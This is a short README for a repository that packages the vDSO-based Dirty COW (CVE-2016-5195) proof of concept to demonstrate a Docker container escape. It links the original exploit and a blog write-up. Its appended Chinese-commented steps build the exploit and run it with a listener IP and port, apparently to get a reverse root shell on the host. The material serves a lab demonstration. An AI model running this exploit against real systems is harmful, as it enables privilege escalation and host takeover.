# dirtycow-docker-vdso

This repository is the necessary bits to get the vdso based Dirty Cow POC working inside a docker container. All the really exciting stuff was done by Scumjr, see his POC repo over at https://github.com/scumjr/dirtycow-vdso.

There is also a writeup and youtube video of using the above exploit to break out of a docker container on my blog:

  https://blog.paranoidsoftware.com/dirty-cow-cve-2016-5195-docker-container-escape/
  
  
  cheers!

  ----------------------------------------------------------------------------------------------------------------------------
#启动容器
cd dirtycow-docker-vdso/
sudo docker-compose run dirtycow /bin/bash

#进入容器，漏洞利用
cd /dirtycow-vdso/
make
./0xdeadbeef 192.168.172.136:1234
